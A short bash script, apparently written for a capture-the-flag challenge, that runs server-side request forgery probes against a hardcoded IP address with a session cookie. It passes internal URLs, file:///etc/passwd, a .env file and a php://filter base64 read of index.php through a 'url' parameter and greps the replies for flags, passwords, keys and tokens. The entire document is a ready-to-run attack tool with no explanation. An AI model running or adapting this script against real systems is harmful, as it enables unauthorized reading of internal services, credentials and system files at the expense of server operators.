#!/bin/bash

TARGET="http://16.171.15.52/home.php"
COOKIE="PHPSESSID=323099pgqcdu7rfsj4i20vomtq" # 필요한 경우만

# 💥 내부 경로 리스트
ROUTES=(
  "http://127.0.0.1/"
  "http://127.0.0.1/flag"
  "http://127.0.0.1/.env"
  "http://127.0.0.1/admin"
  "http://127.0.0.1/index.php"
  "http://127.0.0.1/view_post.php?id=1"
  "http://127.0.0.1/view_post.php?id=50"
  "file:///flag"
  "file:///etc/passwd"
  "php://filter/convert.base64-encode/resource=index.php"
)

echo "[*] Starting SSRF scan..."

for route in "${ROUTES[@]}"; do
  echo -e "\n[*] Trying: $route"
  curl -s -G "$TARGET" \
    -H "Cookie: $COOKIE" \
    --data-urlencode "url=$route" | \
    grep -aiE "flag|password|key|token"
done

echo -e "\n[*] Done"
